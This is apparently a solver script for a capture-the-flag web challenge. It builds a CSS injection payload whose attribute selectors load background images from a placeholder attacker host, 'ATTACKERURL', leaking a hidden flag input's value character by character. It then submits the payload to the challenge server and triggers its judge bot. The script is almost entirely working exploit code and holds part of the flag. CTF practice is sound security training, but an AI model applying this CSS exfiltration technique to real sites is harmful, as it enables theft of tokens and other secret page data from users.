import string
import requests

URL = "http://challs2.nusgreyhats.org:33339/"
HOOK = "ATTACKERURL"
FLAG = "grey{X5S34RCH1fY0UC4NF1ND1T"
FLAG_VALUES = string.ascii_letters + string.digits


def submit(css_value):
    payload = {"css_value":css_value}
    r = requests.post(URL + "submit", data=payload)
    print(r.url)
    r = requests.post(r.url.replace("submission","judge"))
    #requests.post(url)


def exfiltrate_payload():
    payload = ""
    #payload += f"@import url('{HOOK}start?');"
    for i in FLAG_VALUES:
        payload += f'input#flag[value^="{FLAG}{i}"]{{background-image: url("{HOOK}{FLAG}{i}");}}'
    payload += f'input#flag[value="{FLAG}}}"]{{background-image: url("{HOOK}{FLAG}}}");}}'
    #payload += f"@import url('{HOOK}end?');"
    submit(payload)

exfiltrate_payload()
